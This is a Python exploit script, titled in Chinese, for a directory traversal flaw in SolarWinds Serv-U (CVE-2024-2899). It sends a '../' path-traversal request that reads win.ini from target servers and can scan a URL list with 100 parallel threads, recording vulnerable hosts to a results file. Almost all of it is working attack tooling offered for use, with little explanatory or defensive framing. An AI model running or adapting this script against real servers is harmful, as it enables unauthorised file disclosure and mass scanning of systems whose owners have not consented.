#SolarWinds Serv-U 目录遍历漏洞复现(CVE-2024-2899)

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    text = '''
     █████                      ██████   ██████
    ░░███                      ░░██████ ██████
     ░███        ██████   ██████░███░█████░███
     ░███       ░░░░░███ ███░░██░███░░███ ░███
     ░███        ███████░███ ░██░███ ░░░  ░███
     ░███      ████░░███░███ ░██░███      ░███
     ██████████░░███████░░███████████     █████ 
'''
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="CVE-2024-2899")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/?InternalDir=../../../../../../../../windows&InternalFile=win.ini'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:122.0) Gecko/20000101 Firefox/122.0", 
        "Accept-Encoding": "gzip, deflate", 
        "Accept": "*/*", "Connection": "close", 
        "Content-Type": "application/x-www-form-urlencoded"
        }
    proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

    try:
        response = requests.get(url=url,headers=headers,timeout=5,proxies=proxies,verify=False)
        if response.status_code == 200 and 'fonts' in response.text:
            print( f"{GREEN}[+] {url} 存在目录遍历漏洞！{RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
    except Exception:
        pass

if __name__ == '__main__':
    main()
